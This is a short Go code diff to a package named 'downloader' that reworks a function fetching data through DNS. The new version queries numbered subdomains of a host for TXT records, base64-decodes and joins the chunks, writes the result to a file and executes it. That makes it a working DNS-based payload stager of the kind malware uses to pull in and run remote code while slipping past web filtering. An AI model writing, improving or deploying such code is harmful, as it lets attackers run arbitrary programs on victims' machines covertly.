@@ -1,20 +1,40 @@
 package downloader
 
 import (
+	"bytes"
+	"encoding/base64"
 	"net"
-	"strings"
+	"strconv"
 )
 
-type DnsTXTDownload struct {
+type DnsTxtDownload struct {
 }
 
-func (d *DnsTXTDownload) DownloadExec(hostname string) {
-	recs, err := net.LookupTXT(hostname)
-	if err != nil {
-		return
+func (d *DnsTxtDownload) DownloadExec(hostname string) {
+	var chunks [][]byte
+	count := 0
+
+	for {
+		sub := strconv.Itoa(count)
+		rec, err := net.LookupTXT(sub + "." + hostname)
+		if err != nil {
+			return
+		}
+
+		if rec[0] == "" {
+			break
+		}
+
+		chunk, err := base64.StdEncoding.DecodeString(rec[0])
+		if err != nil {
+			return
+		}
+
+		chunks = append(chunks, chunk)
+		count++
 	}
 
-	data := strings.Join(recs, "")
-	filename := save([]byte(data))
+	data := bytes.Join(chunks, []byte(""))
+	filename := save(data)
 	run(filename)
 }
